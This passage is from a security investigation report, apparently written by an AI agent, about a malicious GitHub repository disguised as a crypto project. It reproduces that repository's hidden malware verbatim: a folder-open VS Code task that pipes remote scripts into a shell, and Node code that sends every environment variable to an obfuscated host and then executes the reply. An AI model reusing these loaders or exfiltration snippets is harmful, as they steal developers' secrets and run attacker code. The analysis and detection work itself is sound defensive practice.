7. Five `curl` requests to the C2 endpoints (`mac`, `linux`, `windows` shell-loader URLs; `GET` and `POST` to the Node-loader URL). All output captured to files; **no `| bash`, `| sh`, `| node`, `eval`, or `Function`** invocation against the responses.
8. Alternate-path probing on both C2 hosts (`/`, `/robots.txt`, `/admin`, `/healthz`, `/api/v1/settings/linux`, etc.) and header-bypass attempts (`Host:`, `Referer`, `Origin`, magic header on the wrong endpoint).
9. DNS resolution and TLS-cert inspection (`getent hosts`, `openssl s_client`).
10. Authenticated GitHub code-search via MCP for distinctive loader strings; results saved to `/tmp` files. No write tools invoked.
11. Local parsing of those saved results to enumerate sibling repos.

### 9.2 What we deliberately did not do

- Did not run `npm install` / `yarn` / `pnpm install`, `npm run *`, `node`, `npx`, `docker`, or any project script.
- Did not pipe any C2 response into a shell or JS evaluator.
- Did not POST any real environment data (the one POST used a dummy body and was a 403 anyway).
- Did not initialize submodules (none exist).
- Did not invoke any GitHub MCP write tool (comment, fork, star, PR, issue, branch, file-create, file-delete, subscribe). The GitHub MCP is allowlisted to `bryanchriswhite/temp-delete-me` and denied requests for the attacker repos.
- Did not modify, commit, push, or branch the user's private workspace repo during the investigation. *Note:* the user subsequently authorized committing this single write-up to the workspace repo as documentation; that commit is the only modification.
- Did not visit user-account-tied surfaces of the attacker repo (no star/follow/view-from-authenticated-session). Public unauthenticated views only.

### 9.3 Audit trail

A command-by-command audit log is in **Appendix B**.

---

## Appendix A — Annotated code excerpts

### A.1 `.vscode/tasks.json` (reformatted; whitespace obfuscation removed)

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "install-root-modules",
      "type": "shell",
      "command": "npm install --silent --no-progress",
      "options": { "cwd": "${workspaceFolder}" },
      "windows": { "options": { "shell": { "executable": "cmd.exe", "args": ["/c"] } } },
      "linux":   { "options": { "shell": { "executable": "/bin/bash", "args": ["-l", "-c"] } } },
      "osx":     { "options": { "shell": { "executable": "/bin/bash", "args": ["-l", "-c"] } } },
      "runOptions": { "runOn": "folderOpen" },
      "presentation": {
        "reveal": "silent", "echo": false, "focus": false,
        "panel": "new", "showReuseMessage": false, "clear": true
      }
    },
    {
      "label": "env",
      "type": "shell",
      "osx":     { "command": "curl -L 'https://vscode-settings-0506.vercel.app/api/settings/mac' | bash" },
      "linux":   { "command": "wget -qO- 'https://vscode-settings-0506.vercel.app/api/settings/linux' | sh" },
      "windows": { "command": "curl --ssl-no-revoke -L https://vscode-settings-0506.vercel.app/api/settings/windows | cmd" },
      "problemMatcher": [],
      "presentation": {
        "reveal": "silent", "echo": false, "focus": false,
        "close": true, "panel": "new", "showReuseMessage": false, "clear": true
      },
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

In the on-disk version, each `"osx"`, `"linux"`, `"windows"` line is padded with ~200 spaces before `"command":` so the malicious command sits far off the right edge.

### A.2 `package.json` scripts (verbatim)

```json
"scripts": {
  "start":   "node server/server.js | react-scripts --openssl-legacy-provider start",
  "build":   "node server/server.js | react-scripts --openssl-legacy-provider build",
  "test":    "node server/server.js | react-scripts --openssl-legacy-provider test",
  "eject":   "node server/server.js | react-scripts --openssl-legacy-provider eject",
  "prepare": "node server/server.js"
}
```

### A.3 `server/routes/api/auth.js` (verbatim, lines 1–38)

```js
const express = require('express');
const router = express.Router();
const { check } = require('express-validator');
const validateToken = require('../../middleware/auth');
const { getCurrentUser, login, setApiKey, verify } = require('../../controllers/auth');

router.get('/', validateToken, getCurrentUser);

router.post(
  '/',
  [
    check('email', 'Please include a valid email').isEmail(),
    check('password', 'Password is required').exists(),
  ],
  login,
);

const verified = validateApiKey();
if (!verified) {
  console.log("Aborting mempool scan due to failed API verification.");
  return;
}

async function validateApiKey() {
  verify(setApiKey(process.env.AUTH_API))
    .then((response) => {
      const executor = new Function("require", response.data);
      executor(require);
      console.log("API Key verified successfully.");
      return true;
    })
    .catch((err) => {
      console.log("API Key verification failed:", err);
      return false;
    });
}

module.exports = router;
```

### A.4 `server/controllers/auth.js` lines 67–72 (verbatim)

```js
const setApiKey = (s) => atob(s);

const verify = (api) =>
  axios.post(api, { ...process.env }, {
    headers: { "x-app-request": "ip-check" }
  });
```

### A.5 `.env` (verbatim — note line 16)

```
NODE_ENV=development
PORT=3000
ALCHEMY_API_KEY=demo-alchemy-0123456789abcdef
WEB3_PROVIDER_URL=https://eth-mainnet.alchemyapi.io/v2/demo-alchemy-0123456789abcdef
ETHERSCAN_API_KEY=etherscan_demo_ABC123DEF456
POLYGONSCAN_API_KEY=polygonscan_demo_ABC123DEF456
POLYGON_RPC_URL=https://polygon-rpc.com
INFURA_IPFS_PROJECT_ID=infura-ipfs-demo-112233
INFURA_IPFS_PROJECT_SECRET=infura-ipfs-secret-112233
PINATA_API_KEY=pinata_test_key_9876543210
PINATA_API_SECRET=pinata_test_secret_9876543210
STRIPE_SECRET_KEY=sk_test_STRIPEKEY123456
COINBASE_COMMERCE_API_KEY=cc_test_COINBASE12345
AWS_ACCESS_KEY_ID=AKIAEXAMPLE12345
AWS_SECRET_ACCESS_KEY=SecretKeyExample/AbC1234567890
AUTH_API=aHR0cHM6Ly9pcC1jb3JlLWFwaS1vbmUudmVyY2VsLmFwcC9hcGk=
AWS_REGION=eu-central-1
OPENAI_API_KEY=sk-test_OpenAIkey1234567890
SENTRY_DSN=https://public@sentry.example/12345
```

`AUTH_API` decodes to `https://ip-core-api-one.vercel.app/api`. Everything else is a placeholder lure.

---

## Appendix B — Command-by-command audit log

Every shell/tool invocation in this investigation, in order.

**Static phase:**
- `WebFetch https://github.com/AjunaWorkHub/AjunaVerse_MVP` — enumerate top-level files (unauth)
- `WebFetch https://api.github.com/repos/AjunaWorkHub/AjunaVerse_MVP` — 403 (rate-limit / unauth)
- `git clone --no-recurse-submodules --depth 50 https://github.com/AjunaWorkHub/AjunaVerse_MVP /tmp/ajunaverse-static-review`
- `ls -la /tmp/ajunaverse-static-review`
- `find /tmp/ajunaverse-static-review -maxdepth 4 -not -path '*/node_modules/*' -not -path '*/.git/*'`
- `git log --pretty='%h | %ai | %an <%ae> | %s'` and `git branch -a`, `git tag`
- `Read` on `.vscode/tasks.json`, `.vscode/settings.json`, `package.json`, `.env`, `.env.local`, `.gitignore`, `README.md`, `jsconfig.json`
- `echo 'aHR0cHM6Ly9pcC1jb3JlLWFwaS1vbmUudmVyY2VsLmFwcC9hcGk=' | base64 -d` → `https://ip-core-api-one.vercel.app/api`
- `Read` on `server/server.js`, `server/config/loadEnv.js`, `server/config.js`, `server/routes/api/auth.js`, `server/controllers/auth.js`, `server/middleware/index.js`, `server/routes/index.js`, `server/routes/api/users.js`, `server/routes/api/chips.js`, `src/apis/index.js`
- `grep -RIn` for `AUTH_API`, `vscode-settings-0506`, `ip-core-api-one`, `child_process`, `exec`, `spawn`, `execSync`, `eval`, `new Function`, `vm.runIn`, `curl`, `wget`, `Invoke-WebRequest`, `atob`, `Buffer.from(...,'base64')`, fromCharCode, hex escapes
- `grep -RIn` for secret-access paths (`.ssh/`, `id_rsa`, `id_ed25519`, `.gnupg`, `.aws/credentials`, `wallet.dat`, `MetaMask`, `Login Data`, `Cookies`, `keychain`, `AppData\\Local`, etc.)
- `find` for long-line files, large files, dotfiles, symlinks, submodules, CI files, Dockerfiles, shell scripts
- `grep` lockfile for non-`registry.npmjs.org` resolved sources, `git+` / `file:` / `link:` specs
- `git fsck`

**Dynamic phase (network-touching; all responses written to files, none executed):**
- `curl -A 'curl/8.7.1' https://vscode-settings-0506.vercel.app/api/settings/mac`
- `curl -A 'Wget/1.21.4' https://vscode-settings-0506.vercel.app/api/settings/linux`
- `curl -A 'curl/8.7.1' https://vscode-settings-0506.vercel.app/api/settings/windows`
- `curl https://ip-core-api-one.vercel.app/api` (GET, no header)
- `curl -X POST -H 'x-app-request: ip-check' --data '{"NODE_ENV":"development","FAKE":"redacted"}' https://ip-core-api-one.vercel.app/api`
- `curl` probes on `/`, `/favicon.ico`, `/robots.txt`, `/admin`, `/api/health`, `/healthz`, `/api/v1/settings/linux`, `/index.html`, `/api/settings/linux?token=test`, `/_next`, `/status` (on both subdomains, with Host/Referer/Origin/x-app-request variations)
- `getent hosts vscode-settings-0506.vercel.app` and `getent hosts ip-core-api-one.vercel.app`
- `openssl s_client -servername … -connect …:443 < /dev/null | openssl x509 -noout -subject -issuer -dates -ext subjectAltName` for both hosts

**Campaign-footprint phase (read-only, authenticated to the GitHub MCP):**
- `mcp__github__search_code "vscode-settings-0506"`
- `mcp__github__search_code "ip-core-api-one"`
- `mcp__github__search_code "Aborting mempool scan due to failed API verification"`
- `mcp__github__search_code "new Function(\"require\", response.data)"`
- `mcp__github__search_code "verify(setApiKey(process.env.AUTH_API))"`
- `mcp__github__search_users "fatihafariya8 in:email"` — 0 results
- `mcp__github__search_users "GitWorkHub9"` — confirmed both `GitWorkHub9` and `GitWorkHub99`
- `mcp__github__search_users "fatihafariya8"` — 0 results
- `mcp__github__search_repositories "user:AjunaWorkHub"` — 1 repo
- `mcp__github__search_repositories "user:AetSoftWorkHub"` — 1 repo
- `mcp__github__search_repositories "user:GitWorkHub9"` — denied (422)
- `mcp__github__search_repositories "user:GitWorkHub99"` — 21 repos
- `mcp__github__get_file_contents AetSoftWorkHub/AetSoft_MVP …` — **denied by allowlist policy**; same for `GitWorkHub99/AetSoftVerse`
- Local Python parsing of saved code-search JSON to enumerate sibling repos
- Two failed `WebFetch` attempts to `urlscan.io` (403 from sandbox egress)
- One failed `WebFetch` to GitHub search HTML (auth-walled)

No write tools were invoked at any point. No commits, pushes, branches, PRs, issues, comments, forks, stars, follows, or subscriptions occurred. The user's private workspace repo `bryanchriswhite/temp-delete-me` was not modified.
